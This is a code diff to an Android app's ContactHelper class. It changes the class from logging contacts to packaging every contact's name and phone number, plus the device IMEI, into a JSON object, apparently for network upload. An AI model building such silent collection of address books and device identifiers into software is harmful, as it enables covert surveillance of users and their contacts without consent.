@@ -7,13 +7,21 @@ import android.net.Uri;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import com.family.internet.InternetHelper;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 public class ContactHelper {
     Context c;
     public ContactHelper(Context c) {
         this.c = c;
     }
-    public void getContactList() {
+    public JSONObject getContactList() {
         Logger.l("CONTACT", "BASHLADI");
+        JSONObject ans = new JSONObject();
+        JSONArray jar = new JSONArray();
         int cnt = 0;
         ContentResolver cr = c.getContentResolver();
         Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
@@ -36,9 +44,10 @@ public class ContactHelper {
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(
                                 ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        Logger.l("CONTACT", "Name: " + name);
-                        Logger.l("CONTACT", "Name: " + phoneNo);
-                        Logger.l("CONTACT", getPhoneNumber(this.c, name) + "-----");
+                        //Logger.l("CONTACT", "Name: " + name);
+                        //Logger.l("CONTACT", "Name: " + phoneNo);
+                        jar.put(name + "|" + phoneNo);
+                        //Logger.l("CONTACT", getPhoneNumber(this.c, name) + "-----");
                         cnt++;
                         break;
 
@@ -54,6 +63,15 @@ public class ContactHelper {
         if(cur!=null){
             cur.close();
         }
+        try {
+            ans.put("c", jar);
+            ans.put("imei", new Device(this.c).getImei());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+
+        return ans;
+
     }
 
     public String getPhoneNumber(Context context, String name) {
